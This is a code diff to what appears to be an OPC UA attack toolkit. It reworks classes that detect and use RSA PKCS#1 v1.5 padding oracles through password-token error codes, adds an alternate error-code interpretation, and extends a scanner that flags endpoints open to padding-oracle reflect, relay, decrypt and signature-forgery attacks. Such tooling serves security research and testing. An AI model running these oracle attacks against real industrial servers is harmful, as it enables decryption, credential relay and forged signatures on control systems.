@@ -640,6 +640,17 @@ class OPNPaddingOracle(PaddingOracle):
     return None
     
 class PasswordPaddingOracle(PaddingOracle):
+  def __init__(self, 
+    endpoint : endpointDescription.Type, 
+    goodpadding_errors = [0x80200000, 0x80130000],
+    badpadding_errors =  [0x80210000, 0x801f0000, 0x80b00000],
+  ):
+    super().__init__(endpoint)
+    self._policyId = self._preferred_tokenpolicy(endpoint).policyId
+    self._goodpad = goodpadding_errors
+    self._badpad = badpadding_errors
+  
+  
   @classmethod
   def _preferred_tokenpolicy(_, endpoint):    
     policies = sorted(endpoint.userIdentityTokens, reverse=True, 
@@ -652,11 +663,9 @@ class PasswordPaddingOracle(PaddingOracle):
     
     if policies and policies[0].tokenType == UserTokenType.USERNAME:
       return policies[0]
-  
-  
-  def __init__(self, endpoint):
-    super().__init__(endpoint)
-    self._policyId = self._preferred_tokenpolicy(endpoint).policyId
+    else:
+      return None
+
   
   def _setup(self):
     proto, _, _ = parse_endpoint_url(self._endpoint.endpointUrl)
@@ -706,10 +715,10 @@ class PasswordPaddingOracle(PaddingOracle):
       return True
     except ServerError as err:
       # print(hex(err.errorcode))
-      if err.errorcode == 0x80200000:
+      if err.errorcode in self._goodpad:
         # print('.', end='', file=sys.stderr, flush=True)
         return False
-      elif err.errorcode == 0x80210000 or err.errorcode == 0x801f0000 or err.errorcode == 0x80b00000:
+      elif err.errorcode in self._badpad:
         return True
       else:
         raise err
@@ -735,6 +744,12 @@ class PasswordPaddingOracle(PaddingOracle):
         ep.transportProfileUri.endswith('uatcp-uasc-uabinary')
       )
     )
+    
+class AltPasswordPaddingOracle(PasswordPaddingOracle):
+  # Different interpretation of error codes.
+  def __init__(self, endpoint):
+    super().__init__(endpoint, [0x80130000], [0x80200000, 0x80210000, 0x801f0000, 0x80b00000])
+
     
 class TimingBasedPaddingOracle(PaddingOracle):
   def __init__(self, 
@@ -983,7 +998,10 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
   if try_opn:
     possible_oracles.append(('OPN', OPNPaddingOracle))
   if try_password:
-    possible_oracles.append(('Password', PasswordPaddingOracle))
+    possible_oracles += [
+      ('Password', PasswordPaddingOracle), 
+      ('Password (alt)', AltPasswordPaddingOracle),
+    ]
   
   bestname, bestep, bestoracle, bestscore = None, None, None, 0
   for oname, oclass in possible_oracles:
@@ -997,7 +1015,7 @@ def find_padding_oracle(url : str, try_opn : bool, try_password : bool, timing_t
         log(f'{oname} padding oracle score: {quality}/100')
         if quality == 100:
           log(f'Great! Let\'s use it.')
-          return oracle
+          return oracle, endpoint
         elif quality > bestscore:
           bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
         elif quality == 0 and timing_threshold > 0:
@@ -1349,6 +1367,9 @@ def server_checker(url : str, test_timing_attack : bool):
     if ep.securityPolicyUri == SecurityPolicy.NONE and UserTokenType.USERNAME in tokentypes:
       if any(t.tokenType == UserTokenType.USERNAME and t.securityPolicyUri == SecurityPolicy.BASIC128RSA15 for t in ep.userIdentityTokens):
         findings.append(f'{epname} supports password encryption with Basic128Rsa15. It may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
+        relay_candidate = True
+      else:
+        findings.append(f'{epname} supports password encryption. If PKCS#1v1.5 passwords are accepted it may be vulnerable to a padding oracle attack (which would enable reflect, relay, decrypt and sigforge).')
         relay_candidate = True
     
     # User cert relay.
